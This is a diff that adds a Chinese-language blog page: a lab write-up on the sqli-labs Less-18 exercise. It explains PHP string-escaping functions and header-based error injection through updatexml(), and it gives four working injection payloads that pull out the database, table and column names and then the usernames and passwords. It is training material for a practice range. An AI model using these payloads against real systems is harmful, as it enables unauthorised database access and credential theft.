@@ -1,0 +1,164 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title> - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="npmlab,"> 
+    <meta name="description" content="addslashes()函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是：单引号（’）双引号（”）反斜杠（\）NULL提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle"></h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title"></h1>
+        <div class="stuff">
+            <span>五月 16, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>addslashes()<br>函数返回在预定义字符之前添加反斜杠的字符串。<br>预定义字符是：<br>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL<br>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc() 进行检测。<br>语法：addslashes(string)<br>string 必需。规定要转义的字符串。<br>返回值： 返回已转义的字符串。<br>PHP 版本： 4+</p>
+<p>stripslashes()<br>函数删除由 addslashes() 函数添加的反斜杠。</p>
+<p>mysql_real_escape_string()<br>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：<br>\x00<br>\n<br>\r<br>\<br>‘<br>“<br>\x1a<br>string 必需。规定要转义的字符串。<br>connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。<br>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。</p>
+<p>在靶场less-18中的 check_input()中，对 username 进行各种转义的处理，所以此处不能使用username 进行注入。 需要抓包改包进行head注入。</p>
+<p>updatexml() 更新xml文档的函数<br>语法：updatexml(目标xml文档，xml路径，更新的内容)<br>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！<br>PS：好像当成功闭合函数后之前的查询语句输入进去都会报错，试了很多遍，只有在这个函数下才有回显，所以使用这个函数。 </p>
+<h3 id="接下来开始注入"><a href="#接下来开始注入" class="headerlink" title="接下来开始注入"></a>接下来开始注入</h3><p>先查询数据库名：  </p>
+<pre><code>1&apos; and updatexml(1,concat(0x7e,(select database())),1),&apos;&apos;,&apos;&apos;)#
+</code></pre><p>查询表：  </p>
+<pre><code>1&apos;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),1),&apos;&apos;,&apos;&apos;)#
+</code></pre><p>接下来查自段：  </p>
+<pre><code>1&apos;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)),1),&apos;&apos;,&apos;&apos;)#
+</code></pre><p>查字段内容：  </p>
+<pre><code>1&apos;and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users)),1),&apos;&apos;,&apos;&apos;)#
+</code></pre><p>这就是head注入，根据回显改变闭合方式。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                    
+                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci data-cs data-r data-o data-a="npmlab" data-d="false">查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
